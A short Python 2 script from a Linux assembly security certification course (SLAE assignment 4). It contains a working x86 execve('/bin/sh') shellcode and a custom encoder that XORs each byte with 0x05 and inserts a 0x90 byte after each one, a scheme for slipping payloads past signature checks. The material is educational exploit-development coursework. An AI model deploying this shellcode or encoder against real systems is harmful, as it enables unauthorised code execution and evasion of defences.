#!/usr/bin/python
import sys
import  random
#//Author: Aaron Weathersby
#//SLAE #1488
#//Handle: t0b0x0r
#//github:https://github.com/t0b0rX0r/slae/upload/master/assignment2
#Assignment #4- Custom Encoding Scheme
#created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert


shellcode=("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
encoded =""
encoded2=""

print "Encoding Scheme Used:  XOR'd by 05, insert an additional byte x90"

# xor 05 bytes from orginal
#insert additional byte \\x90
org=""
for y in bytearray(shellcode):
	org+= '0x'+'%02x' %y+','

for x in bytearray(shellcode):
	encoded2+='0x'
	x=x^5
	encoded2+='%02x,'%x
	encoded2+='0x%02x,'%0x90
	


print "Orginal Code:"
print org
print 'Encoded   shellcoded:'
print encoded2
#print shellcode
